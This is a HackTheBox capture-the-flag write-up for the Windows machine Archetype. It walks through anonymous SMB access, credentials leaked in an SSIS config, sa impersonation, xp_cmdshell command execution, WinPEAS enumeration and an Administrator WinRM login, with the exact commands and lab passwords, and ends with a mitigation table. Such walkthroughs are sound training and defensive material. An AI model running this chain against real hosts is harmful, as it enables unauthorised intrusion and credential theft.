# Archetype — HackTheBox

**Platform:** HackTheBox
**Machine:** Archetype
**Difficulty:** Easy
**OS:** Windows
**Date:** 08/02/2026
**Tags:** #enum #foothold #privesc #mssql #smb #ad
**Status:** Retired ✅

## TL;DR

Initial access abuses an **SMB share (`backups`) with anonymous read enabled**, from which an SSIS deployment config file (`prod.dtsConfig`) was pulled containing a **plaintext credential** for the `sql_svc` service account. That account held **`sysadmin`** privilege on MSSQL — a critical over-privilege for an account meant only for application connectivity — which allowed impersonating the `sa` login and enabling `xp_cmdshell`, yielding OS-level command execution.

From `xp_cmdshell`-based execution, WinPEAS was transferred and run to enumerate the host. The decisive finding came from PSReadLine's persisted history (`ConsoleHost_history.txt`), which contained a `net use` command with the **Administrator password in plaintext**. With that credential, WinRM access (`evil-winrm`) yielded a shell as Administrator.

**Attack chain:** Anonymous SMB (`backups`) → MSSQL credentials leaked in `prod.dtsConfig` → `sql_svc` login has `sysadmin` → Impersonate `sa` → `xp_cmdshell` enabled (RCE) → user.txt → WinPEAS reveals Administrator password in PSReadLine history → WinRM as Administrator → root.txt

---

## 1. Recon

### 1.1 Port scan and SMB enumeration

```bash
nmap -oN arch.txt --script smb-enum-shares,smb-enum-users 10.129.239.185
```

| Port | Service |
|---|---|
| 135 | msrpc |
| 139 | netbios-ssn |
| 445 | microsoft-ds |
| 1433 | ms-sql-s |
| 5985 | wsman (WinRM) |

The `smb-enum-shares` NSE script revealed share-level ACLs with no credentials required:

| Share | Anonymous access | Current user access |
|---|---|---|
| ADMIN$ | none | none |
| C$ | none | none |
| IPC$ | READ/WRITE | READ/WRITE |
| backups | **READ** | READ |

Only `backups` stood out — anonymous read access to a non-default share is a direct lead worth pursuing.

`enum4linux -U` confirmed a null session was accepted but returned no usable user/domain enumeration (`NT_STATUS_ACCESS_DENIED` on RPC calls) — expected, since Archetype is a standalone host, not domain-joined.

### 1.2 Credential extraction via anonymous SMB

```bash
smbclient //10.129.239.185/backups -N
```

Found and downloaded a single file, `prod.dtsConfig` (an SSIS package deployment config):

```xml
<ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;
Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;
Auto Translate=False;</ConfiguredValue>
```

This exposed a plaintext credential for a local Windows account used to run SQL Server:

- **User:** `ARCHETYPE\sql_svc`
- **Password:** `M3g4c0rp123`

---

## 2. Foothold

### 2.1 MSSQL authentication and `sa` impersonation

Port 1433 (MSSQL) accepted the leaked credential directly:

```bash
impacket-mssqlclient ARCHETYPE/sql_svc:M3g4c0rp123@10.129.239.185 -windows-auth
```

`sql_svc` was a low-privilege login on its face, but Impacket's `enum_impersonate` exposed an impersonation path:

```sql
enum_impersonate
-- showed: execute-as USER permission on msdb via dc_admin -> MS_DataCollectorInternalUser

exec_as_login sa
enable_xp_cmdshell
```

The `sql_svc` Windows login was itself flagged **`sysadmin`** in `enum_logins`, which is why impersonation to `sa` succeeded so cleanly, and it allowed enabling `xp_cmdshell` (disabled by default) to get OS-level command execution as the SQL Server service account:

```sql
xp_cmdshell whoami
xp_cmdshell dir c:\users\sql_svc\desktop
```

### 2.2 User flag

```
xp_cmdshell powershell -c "Get-Content c:\users\sql_svc\desktop\user.txt"
```

**User flag captured:** `3e7b102e...21a3`

---

## 3. Privilege escalation

### 3.1 Post-exploitation enumeration with WinPEAS

To find a path from `sql_svc`-context command execution to full Administrator, WinPEAS was transferred and executed through the SQL RCE:

1. Hosted `winPEASx64.exe` on the attack box (`python3 -m http.server`) and pulled it down via `Invoke-WebRequest` through `xp_cmdshell`.
2. Ran WinPEAS with output redirected to a file to avoid `xp_cmdshell`'s result-set formatting mangling the report:

   ```
   xp_cmdshell powershell -c "C:\Users\sql_svc\winPEAS.exe > C:\Users\sql_svc\winpeas_out.txt"
   ```

3. Queried the file directly through PowerShell (`Get-Content`, `Select-String`) rather than trying to `type`/`cat` it through `cmd.exe`, since filtering large plaintext output is easier that way over a constrained RCE channel.

Notable findings from the WinPEAS report:

- **NetNTLMv2 hash** for `sql_svc` captured via `Enumerating Security Packages Credentials` — a possible offline-cracking/relay avenue had the credential-history route not panned out.
- **DPAPI master keys** present under `sql_svc`'s profile — another potential path to credential material.
- Several writable `HKLM` registry keys by low-privileged groups (`BUILTIN\Users`) — worth flagging in a real engagement, though not needed for this chain.

The finding that actually mattered was under **Windows Credentials → Recently run commands**, pointing at PowerShell's persisted input history:

```
C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

```
net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
```

**Administrator credential recovered in plaintext:** `MEGACORP_4dm1n!!`

### 3.2 Administrator via WinRM

Port 5985 (WinRM) was open, so the recovered credential could be used directly with no further exploitation:

```bash
evil-winrm -i 10.129.239.185 -u administrator -p 'MEGACORP_4dm1n!!'
```

> **Note on bash quoting:** the password contains `!!`, which triggers bash history expansion if left unquoted or wrapped in double quotes. Single-quoting the password is required for it to be passed through literally.

### 3.3 Root flag

```powershell
Get-Content C:\Users\Administrator\Desktop\root.txt
```

**Root flag captured:** `b91ccec3...8528`

---

## 4. Root cause & mitigation

| # | Vulnerability | Root cause | Mitigation |
|---|---|---|---|
| 1 | Anonymous read on `backups` SMB share | Non-default share created without the same restrictive ACLs as `ADMIN$`/`C$` | Remove guest/anonymous access; restrict share ACLs to required service accounts only |
| 2 | Plaintext credentials in `prod.dtsConfig` | SSIS deployment config file stores connection string with embedded password | Use Windows-integrated auth for SQL connections, or store secrets in a managed vault, never in deployment config files |
| 3 | `sql_svc` service account granted `sysadmin` | Excessive privilege for an account meant only for application connectivity | Principle of least privilege — scope SQL logins to only the databases/permissions the application needs |
| 4 | `xp_cmdshell` enabled/enable-able | Extended procedure allows OS command execution from a compromised SQL login | Keep disabled in production; if required, use a constrained proxy account instead of running as `sa` |
| 5 | Administrator password in `ConsoleHost_history.txt` | PSReadLine persists every line typed into an interactive PowerShell session to disk, with no automatic redaction | Never type secrets inline in an interactive shell; clear/rotate PSReadLine history; use credential vaults or `Get-Credential` prompts instead |

---

## 5. Lessons learned

- A single readable SMB share, even a non-default one, is worth fully enumerating before moving on — `IPC$`/`ADMIN$` being locked down doesn't mean the box is secure if a custom share was added without the same ACLs.
- SSIS/DTS configuration files are a well-known credential leakage vector, since connection strings are frequently left in plaintext to enable deployment automation.
- Granting `sysadmin` to a service account used only for application connectivity is a critical over-privilege — almost any compromise of the login turns into RCE via `xp_cmdshell`.
- PSReadLine history is one of the most valuable and recurring places to check during Windows privilege escalation: any command typed with an inline password (`net use`, `runas`, ad-hoc scripts) becomes a permanent credential leak sitting in a normal user-readable file.

---

## Tools used

`nmap`, `smbclient`, `enum4linux`, `impacket-mssqlclient`, `impacket-smbserver`, `winPEASx64.exe`, `evil-winrm`

## MITRE ATT&CK mapping

- **T1552.001** — Unsecured Credentials: Credentials in Files (`prod.dtsConfig`, `ConsoleHost_history.txt`)
- **T1078** — Valid Accounts (`sql_svc`, `administrator`)
- **T1059.003 / T1059.001** — Command execution via `cmd.exe` / PowerShell (`xp_cmdshell`)
- **T1021.006** — Remote Services: Windows Remote Management (WinRM)
